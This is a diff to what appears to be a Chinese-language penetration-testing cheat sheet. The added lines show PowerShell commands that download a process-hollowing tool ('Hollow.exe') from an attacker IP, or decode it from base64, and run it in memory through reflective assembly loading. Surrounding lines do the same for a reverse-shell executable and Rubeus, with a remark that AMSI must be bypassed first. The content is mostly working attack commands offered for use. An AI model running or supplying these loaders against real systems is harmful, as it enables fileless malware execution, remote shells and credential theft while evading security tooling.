@@ -91,6 +91,24 @@ $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.16.7/P
 
 # 下载执行exe程序
 
+# 执行hollow
+
+1. 远程加载
+```
+$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.161/Hollow.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[Hollow.Program]::Main("")  //这里一定要带引号
+```
+
+2. 把Hollow.exe转成base64(kali执行：```base64 Hollow.exe```)
+```
+$base64 = "TVqQAAMAA....AA=";
+$data  = [System.Convert]::FromBase64String($base64);
+$assem = [System.Reflection.Assembly]::Load($data)
+[Hollow.Program]::Main("")
+```
+
+其他
 需要注意下面所有方法必须先绕过AMSI
 ```
 # Download and run assembly without arguments
@@ -98,6 +116,7 @@ $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.16.7/P
 $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
 $assem = [System.Reflection.Assembly]::Load($data)
 [rev.Program]::Main()
+
 
 
 # Download and run Rubeus, with arguments (make sure to split the args)
